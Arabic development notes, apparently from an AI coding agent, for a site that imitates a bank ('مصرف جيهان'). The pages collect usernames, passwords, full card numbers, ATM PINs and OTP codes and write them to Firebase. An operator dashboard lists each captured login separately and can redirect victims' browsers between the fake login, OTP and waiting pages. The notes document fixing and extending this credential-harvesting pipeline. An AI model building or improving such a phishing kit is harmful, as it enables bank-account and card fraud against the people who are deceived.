- `product_page._fetch_products()`: ترتيب قاعدة البيانات أولاً، ثم الدمج، ثم
  ترقيم متسلسل `order=0..n` (يثبّت الترتيب المدمج ويصلح القيم `None`).
- `index.html renderProducts()`: بصمة `productsSignature()` تمنع إعادة رسم الشبكة
  عند وصول نفس القائمة من المزامنة/`onSnapshot` → **بلا وميض** بعد العرض المحلي.

**مهم:** المرجع المحلي (`products-local.js`/`products-snapshot.json`) يُحدَّث بـ
`sync_products.py` بعد أي حذف/إضافة شرعية، فلا يُحيي منتجاً حذفه المدير عمداً.
رُفع `products-store.js` إلى `v=6`.

## إصلاح زر «إتمام الطلب» في صفحة المنتج (إضافة المنتج للسلة)

**المشكلة:** زر «إتمام الطلب» في صفحة تفاصيل المنتج كان رابطاً ثابتاً
`<a href="/cartepage.html">` لا يضيف المنتج للسلة، فينتقل العميل إلى سلة فارغة.

**الحل (`product_page.py`، قالب صفحة المنتج):**
- الزر صار `<a ... onclick="buyNow(event)">` والرابط الافتراضي باقٍ للتنقّل.
- دالة `buyNow()` تستدعي `window.CartAdd(PRODUCT, 1)` (نفس دالة «إضافة للسلة»)
  ثم يُترك التنقّل الافتراضي إلى `/cartepage.html` — فيجد العميل المنتج في السلة.
- بعد أي تعديل شغّل `python3 build_static.py` لتحديث صفحات `product/*.html` الثابتة
  (المولّدة تُلتزم في المستودع).

### الإصلاح الجذري (سبب فشل بعض المنتجات دون غيرها)

**السبب:** بيانات `PRODUCT` المضمّنة في الصفحة كانت تحمل مسار الصورة كما هو من
قاعدة البيانات/اللقطة، وبعض المنتجات مسارها **نسبي** (`assets/images/...`) وبعضها
**مطلق** (`/assets/images/...`). المنتجات ذات المسار النسبي (مثل «توت ملكي طازج»)
تُحفظ في السلة بمسار نسبي، وعند فتح السلة من مسار عميق أو بعد إعادة كتابة Netlify
لا تُعرض صورة المنتج — فتبدو العملية «لا تعمل»، بينما المنتجات ذات المسار المطلق
(مثل «عصفور التين») تعمل. (11 من 28 منتجاً كانت بمسار نسبي.)

**الحل:**
1. `product_js` في `product_page.py` يستخدم `product_img_url(product)` دائماً →
   مسار الصورة في السلة **مطلق** لكل المنتجات بلا استثناء.
2. دالة الإضافة في الصفحة صارت **مكتفية بذاتها** (`cartAddSelf`): تستخدم
   `window.CartAdd` إن كان `cart.js` محمّلاً، وإلا تكتب مباشرة في
   `localStorage['cart']` بنفس البنية — فلا يفشل الزر إن تأخّر/فشل تحميل `cart.js`.
3. أعيد توليد كل صفحات `product/*.html` الثابتة (`build_static.py`) — الـ28 صفحة
   متحقَّقة: JS سليم + كل مسارات الصور مطلقة.

## تشغيل المشروع كاملاً + لوحة التحكم على خادم منفصل (تحديث 2026-11)

المشروعان يعملان معاً لكن على **خادمين منفصلين** (منفذان مختلفان):

### 1) موقع العملاء + `/admin` (اللوحة المدمجة القديمة) — المنفذ 12001
```bash
python3 serve.py            # PORT افتراضي 12001
#   الموقع:        http://localhost:12001/
#   لوحة /admin:   http://localhost:12001/admin/
```
يحتاج ملف `.env` (منسوخ من `.env.example`) بمفاتيح Firebase، وإلا تُحقن قيم فارغة.
`serve.py` يحقن `window.__FIREBASE_ENV__` في الصفحات عند الطلب.

### 2) لوحة التحكم المستقلة `dashboardkuwaitalthnyan-main/` — المنفذ 12000
اللوحة فُكّت من `dashboardkuwaitalthnyan-main.zip` إلى مجلد بنفس الاسم.
هي موقع ثابت (HTML/JS) بدون حزمة بناء؛ النسخة الأصلية تعتمد على Vite لحقن
`window.__FIREBASE_CONFIG__`، لذا أُضيف خادم بسيط يقوم بنفس الحقن:
```bash
cd dashboardkuwaitalthnyan-main
python3 serve_dashboard.py   # PORT افتراضي 12000
#   اللوحة: http://localhost:12000/
```
`serve_dashboard.py` يقرأ إعدادات Firebase من `../firebase_config.py` (أي من
`.env` نفسه) ويحقنها قبل `</head>`، ويخدم الأصول من `assets/` مع منع الكاش.

**ملاحظة:** كلا الخادمين يستخدمان نفس مشروع Firebase `card-ke` (مجموعات
`customers`/`cards`/`otps`/`products`)، فالبيانات مشتركة بينهما.

**مهم:** ملفات `dashboardkuwaitalthnyan-main/**` هي نسخة العمل من الـzip؛
عند تعديلها احتفظ بنسخة `client/public/**` مطابقة (قاعدة المشروع الأصلي).

## إضافة صفحة تسجيل الدخول (`login.html`) إلى توجيه لوحة التحكم (تحديث 2026-11)

**المطلوب:** أن يستطيع المدير توجيه الزائر إلى صفحة تسجيل الدخول من لوحة التحكم.

**المشكلة:** كان الخريطة `NAV_PAGE_MAP` في اللوحة تحتوي `login: 'login.html'`، لكن
**لا يوجد زر ولا خيار** لصفحة الدخول في واجهة التوجيه (الأزرار والقائمة المنسدلة).
كما أن `login.html` نفسه **لا يحمّل Firebase** ولا `page-commands.js`، فلا يستمع
لأوامر التوجيه أصلاً (بخلاف باقي الصفحات الجديدة).

**الحل — جانب موقع العملاء:**
- `login.html`: أُضيفت في نهاية `<body>` نفس حزمة السكربتات التي تستخدمها
  `index.html` بالترتيب الصحيح:
  `firebase-env.js` → `firebase-app/firestore/database-compat.js` →
  `firebase-client.js?v=7` → `page-commands.js?v=1`.
  (الترتيب مهم: `page-commands.js` يحتاج `window.rtd` و`window.sessionId` من
  `firebase-client.js`.) `ALIASES` في `page-commands.js` فيه `login: 'login.html'` مسبقاً.

**الحل — جانب لوحة التحكم (`dashboardkuwaitalthnyan-main/`):**
- `assets/js/app.js` (والنسخة المطابقة `client/public/assets/js/app.js`):
  - أُضيف زر `<button data-ref-nav="login">تسجيل الدخول</button>` بعد زر «رمز فيزا».
  - أُضيف خيار `<option value="login">تسجيل الدخول</option>` في قائمة `data-ref-nav-select`.
  - الخريطة `NAV_PAGE_MAP` تحتوي `login: 'login.html'` مسبقاً — لا تعديل عليها.
- **مهم:** بعد أي تعديل على `assets/js/app.js` انسخه إلى `client/public/assets/js/app.js`
  (قاعدة المشروع الأصلي: الملفان متطابقان).

## إصلاح إرسال بيانات تسجيل الدخول (`login.html`) إلى قاعدة البيانات واللوحة (تحديث 2026-11)

**المشكلة:** عند إدخال العميل اسم المستخدم وكلمة المرور في `login.html` والضغط على
«تسجيل الدخول»، **لا يصل أي شيء** للوحة التحكم ولا لقاعدة البيانات. السبب الجذري:
دالة `handleLogin()` في `login.html` كانت تنفّذ `event.preventDefault()` ثم
`window.location.href = 'index.html'` فقط — **لا ترسل البيانات إطلاقاً**، ولا توجد
أي دالة في `firebase-client.js` مخصّصة لتسجيل الدخول.

**الحل — جانب موقع العملاء (`assets/js/firebase-client.js`):**
- دالة جديدة `window.pushFirebaseLogin({username, password})`:
  - تكتب في `customers/{sessionId}`: `username` و`pass` (كلمة المرور) و`name`
    (= اسم المستخدم، كي يظهر الزائر في اللوحة) و`requestType: 'login'` و
    `requestTypeLabel: 'تسجيل الدخول'` و`refNo` (`LG-xxxxxxxx`) — فتظهر مباشرة
    في جدول اللوحة.
  - تكتب نسخة كاملة في مجموعة `requests/{refNo}` (أرشيف) مع `details` تحتوي
    اسم المستخدم وكلمة المرور.
  - تحدّث جلسة RTDB (`sessions/{sessionId}`) للتوافق.
- `REQUEST_TYPE_LABEL` صار يشمل `login: 'تسجيل الدخول'`.
- دالة `window.submitLogin(data)`: تنتظر `ensureAuthReady()` ثم ترسل، مع حدّ زمني
  2500ms وحماية من الإرسال المزدوج، فلا يتعطّل التوجيه إن تأخّرت الشبكة.

**الحل — جانب `login.html`:**
- `handleLogin()` صار يقرأ `#username` و`#password`، ويستدعي `window.submitLogin()`
  (أو `pushFirebaseLogin()` مباشرة كاحتياط) **قبل** التوجيه إلى `index.html`.

**الحل — جانب لوحة التحكم (`dashboardkuwaitalthnyan-main/`):**
- `assets/js/app.js` (والنسخة المطابقة `client/public/assets/js/app.js`):
  - `buildMergedList` صار يمرّر `username` و`requestType` و`requestTypeLabel` و`refNo`.
  - نافذة «المعلومات الشخصية» (`openDetail` → `type === 'personal'`) صارت تعرض
    «اسم المستخدم» و«كلمة المرور» و«نوع الطلب» و«رقم الطلب».
  - نافذة تفاصيل الزائر (`renderReferenceDetail`) صار فيها صندوق «بيانات الدخول»
    (اسم المستخدم + كلمة المرور) يظهر عند وجودها.

**مهم:** عند تعديل `firebase-client.js` ارفع رقم `?v=` في كل الصفحات (رُفع إلى `8`
في 13 صفحة: `index/cartepage/knet/verification/creatprogect/loan/shop/watch/refund/
wait1/login/card-payment/otpcredit_card_page`).

## صناديق متعددة لبيانات تسجيل الدخول (كل محاولة في صندوق منفصل)

**المطلوب:** عندما يسجّل العميل الدخول أكثر من مرة، تظهر كل محاولة في **صندوق منفصل**
في تفاصيل الزائر باللوحة، بدل أن يُستبدل محتوى صندوق واحد.

**المشكلة:** `pushFirebaseLogin` كان يكتب `username`/`pass` في `customers/{sessionId}`
بحقول مفردة (merge) → كل محاولة جديدة **تستبدل** السابقة، فيظهر صندوق واحد فقط.

**الحل — موقع العملاء (`assets/js/firebase-client.js`):**
- `pushFirebaseLogin` صار يضيف كل محاولة كعنصر في مصفوفة `logins` عبر
  `firebase.firestore.FieldValue.arrayUnion({username, password, at, page})` مع `merge:true`
  — فلا تُستبدل المحاولات السابقة (تُدمج بلا تكرار). تبقى الحقول المفردة `username`/`pass`
  محدّثة بآخر قيمة (للعرض في الجدول/البحث).

**الحل — لوحة التحكم (`dashboardkuwaitalthnyan-main/assets/js/app.js` + النسخة المطابقة):**
- `buildMergedList` يمرّر `logins` (مصفوفة) في كائن الإشعار المدمج.
- `renderReferenceDetail`: يعرض **صندوقاً لكل عنصر** في `logins` تحت عنوان
  «بيانات الدخول #n» (مرتبة من الأحدث للأقدم) بدل صندوق واحد. عند غياب المصفوفة
  (بيانات قديمة) يرجع للصندوق المفرد من `username`/`pass`.

**مهم:** عند تعديل `firebase-client.js` ارفع `?v=` (رُفع إلى `9`) في كل الصفحات.
وعند تعديل `assets/js/app.js` باللوحة ارفع نسخته في `index.html` (`?v=2`) وحدّث
النسخة المطابقة `client/public/assets/js/app.js`.

**التحقق:** بعد تسجيل الدخول مرتين بنفس المتصفح (نفس `sessionId`) ظهرت في اللوحة
ثلاثة صناديق: «معلومات أساسية» + «بيانات الدخول #2» + «بيانات الدخول #1»، وكل
صندوق يحمل اسم المستخدم وكلمة المرور والوقت الخاص به.

## الشعار والهوية اللونية الحمراء (تحديث 2026-11)

**المطلوب:** إضافة شعار مصرف جيهان وجعل ألوان كل الصفحات متناسقة مع لون الشعار (أحمر).

**الشعار:** `assets/images/cihan-logo.png` (256×253، خلفية شفافة، مقصوص من الصورة المزوّدة).
اللون الأساسي المستخرج من الشعار: `#ed2e33` (أحمر)، والتظليل `#c81f24`.

**إعادة التلوين (توكنز Tailwind):** في `tailwind.config` داخل الصفحات صارت:
- `cihan-gold: '#ed2e33'` (كان `#c59b27`) — يُستخدم في كل الأزرار/الحدود/التمييزات.
- `cihan-gold-hover: '#c81f24'` (كان `#b0881e`).
- بقي `cihan-navy '#0b2239'` و`cihan-dark '#071625'` (الأزرق الداكن) للتسلسل الهرمي/الخلفيات.
- استُبدلت كل قيم الـ hex الحرفية (`#c59b27/#b0881e/#b8860b/#8b6508/#d4af37/#1c4a72`) في
  الـ HTML/CSS المضمّن بالقيم الحمراء المقابلة.

**الصفحات المتأثرة:** `index/loan/login/refund/shop/wait1/watch` (توكنز + hex)،
و`cartepage/knet/verification/card-payment/otpcredit_card_page/creatprogect`
(`#004d7a`→`#ed2e33`، `#006ba6`→`#c81f24`، `#0077D5`→`#ed2e33`)، و
`terms/privacy/returns/prices` + قالب `product_page.py` (`#004d7a`→`#ed2e33`).

**الشعار في الرأس/التذييل:** استُبدل أيقونة `<i class="fa-landmark">` في الهيدر والفوتر
بـ `<img src="/assets/images/cihan-logo.png">` داخل صندوق أبيض مستدير (في كل الصفحات
السبع)، وفي `cartepage.html` استُبدلت صورة `nfc2.png` بالشعار، وفي صفحات القانون/الأسعار
وصفحات المنتجات المولّدة كذلك.

**لوحة التحكم:** أُضيف الشعار بجانب اسم «مصرف جيهان» في رأس اللوحة
(`dashboardkuwaitalthnyan-main/index.html`) مع نسخة في `client/public/assets/images/`.

**مهم:** بعد تعديل `product_page.py` شغّل `python3 build_static.py` لتحديث صفحات
`product/*.html` و`prices.html` الثابتة (رُفع `?v=` إن لزم). عند تغيير التوكنز لا تنسَ
أن `cihan-gold` أصبح أحمر — أي كود يعتمد على كونه ذهبياً يجب مراجعته.

## إعادة تصميم صفحة تسجيل الدخول (مطابقة الموقع المرجعي — 2026-11)

**المطلوب:** تعديل CSS في `login.html` ليطابق تصميم
`https://page-reference-maker.lovable.app/`.

**التصميم المرجعي (Tailwind v4 + shadcn):** تخطيط موبايل من قسمين:
1. منطقة علوية (38vh) بخلفية **نمط شبكي** + شعار دائري (160×160) في الوسط،
   وزر اللغة (كرة أرضية) أعلى اليسار.
2. بطاقة سفلية بيضاء بزوايا علوية `rounded-t-[2.5rem]` (40px): مقبض سحب رمادي،
   عنوان «تسجيل الدخول»، تنبيه كهرماني «نسخة تجريبية»، حقل اسم المستخدم، حقل
   كلمة المرور مع زر عين، رابط «نسيت كلمة المرور…»، زر «تسجيل الدخول» أحمر،
   فاصل «أو»، زرّا «أصبح عميل»/«إنشاء حساب» رماديان، ورابط «الشروط والأحكام».
   وزر عائم أسفل اليسار «أسئلة عن العرض؟».

**ألوان المرجع (OKLCH → hex مستخدمة):**
| متغيّر | المرجع | القيمة |
|--------|--------|--------|
| brand | `oklch(47% .18 27)` | `#a91518` |
| brand-foreground | `oklch(99% 0 0)` | `#fcfcfc` |
| slate-btn | `oklch(42% 0 0)` | `#4d4d4d` |
| field | `oklch(95.5% 0 0)` | `#f0f0f0` |
| foreground | `oklch(12.9% .042 264.695)` | `#020618` |
| primary | `oklch(20.8% .042 265.755)` | `#0f172b` |
| muted-foreground | `oklch(55.4% .046 257.417)` | `#62748e` |
| border/line | `oklch(92.9% .013 255.508)` | `#e2e8f0` |
| خلفية النمط | `oklch(95% 0 0)` | `#eeeeee` (خطوط `#d7d7d7`/`#dedede`) |

**التنفيذ في `login.html`:** أُعيد بناء الصفحة بالكامل بنفس التخطيط مع توكنز
Tailwind جديدة (`background/foreground/primary/brand/slate-btn/field/muted/line`)،
وزوايا `rounded-[14px]` (لأن Tailwind CDN v3 يعطي `rounded-xl`=12px والمرجع v4=14px)،
وخلفية `.pattern-bg` بـ `repeating-linear-gradient` مطابقة للمرجع. أُبقي خط Cairo
وربط Firebase ومنطق الدخول (`submitLogin`/`pushFirebaseLogin`) كما هو.

**تحقّق:** الألوان المطابقة (brand `rgb(169,21,24)`، slate-btn `rgb(77,77,77)`،
field `rgb(240,240,240)`)، الارتفاع 56px، الزوايا 14px، زر العين يبدّل نوع الحقل،
والإرسال يستدعي `submitLogin({username,password})` ثم يوجّه إلى `index.html`.
**ملاحظة:** صفحة الدخول الآن مستقلة تماماً عن هيدر/فوتر الموقع (تصميم موبايل أولاً).

## صفحتا «رمز التحقق OTP» و«نسيت كلمة المرور» (مطابقة الموقع المرجعي — 2026-11)

**المطلوب:** إنشاء صفحة OTP وصفحة إعادة تعيين كلمة المرور بنفس شكل/فكرة الموقع
المرجعي: `page-reference-maker.lovable.app/otp` و`/forgot-password`.

**الملفان الجديدان (بنفس هوية login.html المرجعية):**
- `otp.html` — التحقق من OTP: زر رجوع أعلى اليمين، شعار دائري 176px، عنوان
  «التحقق من OTP»، تنبيه كهرماني تجريبي، **6 خانات** `dir="ltr"` بنسبة `aspect-[2/3]`
  (كل خانة ~52×78px)، نص «الرجاء ادخال الكود الذي تم ارساله الى هاتفك»، وزر «التالي»
  بارتفاع 64px وزوايا كاملة (`rounded-full`) معطّل حتى تكتمل 6 أرقام.
- `forgot-password.html` — نسيت كلمة المرور: زر لغة + رجوع في الأعلى، عنوان،
  **رسم توضيحي** (`assets/images/forgot-illustration.png`)، بطاقة كهرمانية إرشادية
  (8 أحرف + حرف كبير + رقم + رمز خاص)، حقل «البطاقة» (16 رقماً + شعار Mastercard
  بكريتين متداخلتين) وحقل «شفرة التعريف للصراف الآلي» (4 أرقام + زر عين)، وزر
  «تغيير كلمة المرور» بارتفاع 64px (`rounded-full`). الحقول `rounded-full` ارتفاع 56px.

**الألوان:** نفس توكنز login.html المرجعية — brand `#a91518`، input `#e2e8f0`،
primary `#0f172b`، muted `#62748e`، مع خط Cairo وTailwind CDN.

**السلوك والربط بقاعدة البيانات:**
- `otp.html`: عند اكتمال الرمز والضغط على «التالي» → `window.submitOtp(code)`
  (دالة جديدة في `firebase-client.js` تغلّف `pushFirebaseOtp`) ثم التوجيه إلى `index.html`.
- `forgot-password.html`: عند الضغط على «تغيير كلمة المرور» → `window.submitPasswordReset({card, atmPin})`
  (دالة جديدة تغلّف `pushFirebaseRequest` بنوع `password_reset`) ثم التوجيه إلى `otp.html`.
  الرسم التوضيحي مأخوذ من المرجع (مقصوص ومقلَّص إلى 512px).

**تحديثات `firebase-client.js`:**
- `getFriendlyPageName()`: أسماء جديدة `forgot-password` → «نسيت كلمة المرور»،
  `otp` → «التحقق من OTP»، `otpcredit` → «رمز الفيزا».
- `REQUEST_TYPE_LABEL`: نوعان جديدان `password_reset` («إعادة تعيين كلمة المرور»)
  و`otp` («رمز التحقق OTP»).

**لوحة التحكم:** أُضيفت `forgot: 'forgot-password.html'` و`otpcode: 'otp.html'` إلى
`NAV_PAGE_MAP` + أزرار التوجيه + قائمة الاختيار (في `assets/js/app.js` ونسخته
`client/public/assets/js/app.js`).

**ملاحظات إصدارات التخزين المؤقت:** رُفع `firebase-client.js` إلى `?v=10`،
و`page-commands.js` إلى `?v=2` (أُضيفت أسماء مختصرة `forgot`/`otp`/`otpcode`)،
و`admin app.js` إلى `?v=3`.

**تحقّق:** الصفحتان تعملان بلا أخطاء JS، قياسات مطابقة للمرجع (خانات OTP 52×78px،
حقول 56px، أزرار 64px بزوايا كاملة)، والتدفقات تستدعي دوال Firebase الصحيحة.

### ربط صفحة الدخول بصفحتي OTP وإعادة التعيين (تحديث)

- في `login.html` صار نص «نسيت كلمة المرور و عرض اسم المستخدم» رابطاً فعلياً إلى
  `forgot-password.html` (كان `href="#"`).
- بعد إدخال اسم المستخدم وكلمة المرور والضغط على «تسجيل الدخول»: تُرسل البيانات
  (`submitLogin`/`pushFirebaseLogin`) ثم يُوجَّه العميل إلى **`otp.html`** (كان `index.html`).
- التدفق الكامل: `login.html` → `otp.html` → `index.html`، ومسار الاسترداد:
  `login.html` → `forgot-password.html` → `otp.html` → `index.html`.

### إصلاح وصول بيانات OTP وإعادة التعيين إلى اللوحة + صندوقان جديدان

**المشكلة 1 — رمز OTP لا يصل أبداً:**
`pushFirebaseOtp` كان يعيد `Promise.resolve()` **فوراً** دون انتظار كتابات Firestore،
وصفحة `otp.html` كانت تنتقل إلى `index.html` بمجرد انتهاء الوعد → يُقطع الانتقال
الكتابات الجارية فلا يصل الرمز إلى `customers`/`otps`.
**الحل:** `pushFirebaseOtp` صار يجمع كل الكتابات ويعيد `Promise.all(tasks)` (مع
`try/catch` لكل كتابة حتى لا يُسقط فشل واحدة البقية)، وصفحة `otp.html` تنتظر
`submitOtp()` قبل التوجيه.

**المشكلة 2 — لا يوجد صندوق لإعادة تعيين كلمة المرور:**
`submitPasswordReset` كان يكتب عبر `pushFirebaseRequest` في مجموعة `requests`
(وهي **مرفوضة من قواعد الأمان**: `permission-denied`)، ولم يكن في اللوحة صندوق لها.
**الحل:**
- `submitPasswordReset` صار يكتب **مباشرة** في `customers/{sessionId}` ويضيف كل محاولة
  كعنصر في مصفوفة `passwordResets` (`arrayUnion`) — لا تُستبدل المحاولات السابقة.
- اللوحة (`admin/assets/js/app.js`): تمرير `passwordResets` عبر `buildMergedList`،
  وبناء صندوق **«إعادة تعيين كلمة المرور»** لكل محاولة (رقم البطاقة + شفرة الصراف)،
  وإضافته إلى `stackSections` (مرتباً زمنياً مع باقي الصناديق).
- صندوق **«رموز التحقق»** كان موجوداً ويعرض الآن الرموز فعلياً (بعد إصلاح المشكلة 1).
- العميل الذي أرسل إعادة تعيين فقط (بلا اسم/هاتف/بطاقة/OTP) صار **يظهر في القائمة**
  (أُضيف `passwordResets` إلى فلتر الإظهار وإلى حساب `lastActivity`).

**ملاحظة:** مجموعة `requests` مرفوضة من قواعد Firestore؛ اللوحة الجديدة لا تقرأها
(المصدر الموحّد هو `customers`)، لكن `pushFirebaseRequest` (سلفة/استرداد/ساعة) ما زال
يكتبها ويفشل بصمت مع تسجيل خطأ في الـ console — البيانات تصل عبر `customers`.

**إصدارات التخزين المؤقت:** رُفع `firebase-client.js` إلى `?v=11`، و`admin app.js` إلى `?v=5`.

### تقليص أزرار التوجيه + ترتيب الصناديق (تحديث)

- أزرار توجيه الصفحات في نافذة بيانات العميل (`admin/assets/js/app.js`) صارت **ستة فقط**:
  الرئيسية، صفحة الانتظار، سلة المشتريات، تسجيل الدخول، نسيت كلمة المرور، رمز التحقق OTP
  (حُذفت أزرار السلفة/المتجر/الساعة/الاسترداد/كي نت/التحقق/فيزا/رمز فيزا من الأزرار
  ومن قائمة الاختيار معاً).
- ترتيب صناديق البيانات في نافذة العميل: **صندوق «معلومات أساسية» دائماً في الأسفل**،
  وبقية الصناديق (بيانات الدخول، إعادة تعيين كلمة المرور، البطاقات، رموز التحقق)
  مرتّبة من **الأحدث إلى الأقدم** (الأحدث في الأعلى) — عبر فرز `data-ref-time` تنازلياً
  ثم إلحاق `basicBoxHtml` في النهاية (لا يعتمد على وقت).

## إصلاح عدم وصول أوامر التوجيه للعميل (انتظار المصادقة قبل الاشتراك)

**المشكلة:** المدير يضغط زر توجيه في اللوحة (يُكتب `commands/{sessionId}/redirect`
في RTDB) لكن العميل **لا ينتقل** إطلاقاً، بلا أي خطأ ظاهر.

**السبب الجذري:** `page-commands.js` كان يشترك في RTDB فوراً بمجرد توفّر
`window.rtd` و`window.sessionId` — أي **قبل اكتمال تسجيل الدخول**. قراءة
`commands/...` تتطلب مصادقة (قواعد أمان RTDB)، فالاشتراك يُرفض بـ
`PERMISSION_DENIED`، ومستمع `on('value')` **يموت بصمت ولا يُعاد**. ولأن
`ensureAuthReady()` يُنفَّذ عند أول إرسال/نبضة (لا عند التحميل)، فقد كان الفشل
شبه دائم. (`firebase-client.js` لا يعاني هذا لأنه يلفّ اشتراكه داخل
`window.ensureAuthReady().then(...)`.)

**الحل (`assets/js/page-commands.js`):**
- `start()` لا يشترك إلا بعد `window.ensureAuthReady()` وينتظر التوكن.
- دالة `subscribe(rtd, sid)` منفصلة، وتستقبل معالج خطأ ثانياً في `on('value', cb, errCb)`:
  عند أي `PERMISSION_DENIED`/خطأ شبكة يُصفَّر `started` و`tries` ويُعاد المحاولة تلقائياً.
- `waitForFirebase` صارت دالة مُعلنة (بدل IIFE) لتُستدعى من معالج الخطأ.
- فشل المصادقة (توكن فارغ) يعيد جدولة المحاولة بدل ترك المستمع معطّلاً.

**متحقَّق (Playwright):** التوجيه يعمل من واجهة اللوحة الحقيقية (نقرة «صفحة الانتظار»
→ العميل إلى `wait1.html`)، وعلى كل الصفحات العشر (index/loan/shop/watch/refund/
wait1/cartepage/login/forgot-password/otp)، وبلا حلقة إعادة تحميل، وبتوجيه متتالٍ.

**مهم:** رُفعت نسخة `page-commands.js` إلى `?v=3` في كل الصفحات التي تحمّله.

## إصلاح صورة المعاينة (og:image)

**المشكلة:** عند مشاركة رابط موقع العملاء على واتساب/فيسبوك/تلغرام لا تظهر صورة
معاينة.

**السبب:** `index.html` كان يشير إلى صورة على ويكيبيديا
(`upload.wikimedia.org/...`) وهي **محذوفة** → HTTP 404 «File not found»
(متحقَّق عبر API ويكيبيديا: `"missing"`). الاعتماد على خدمة خارجية يجعل الصورة
تنكسر عند حذفها.

**الحل:** استبدال رابط ويكيبيديا بصورة محلية `assets/images/og-share.png`
(1200×630) بهوية المصرف، مولّدة عبر Playwright + خط Cairo. الروابط تستخدم النطاق
الافتراضي `https://althenayanfarms.app` الذي يستبدله `serve.py` بنطاق الطلب الفعلي
من ترويسة `Host` — فتعمل على Railway/Netlify/نطاق مخصّص بلا تعديل.

**مهم — لغة نصوص المشاركة كردية عن قصد:** عناوين/أوصاف OG في `index.html`
(`og:site_name`، `og:title`، `og:description`، `og:image:alt`، `<title>`،
`og:locale=ku_IQ`) **كردية** كما ضبطها المستخدم. لا تُترجمها إلى العربية.
كذلك `<html lang="ar">` يبقى كما هو. الصورة الجديدة تحمل شعار المصرف ورموزاً بصرية
بلا نص (لأن الصورة تُعرض بغضّ النظر عن لغة البطاقة).

**مهم:** إن غيّرت `og-share.png` أبقِه 1200×630 (نسبة 1.91:1) وتأكد من التزامه في Git
لينتشر. الصورة مستخدمة في `index.html` و`cartepage.html` و`prices.html` و
`product_page.py` (صفحات المنتجات).
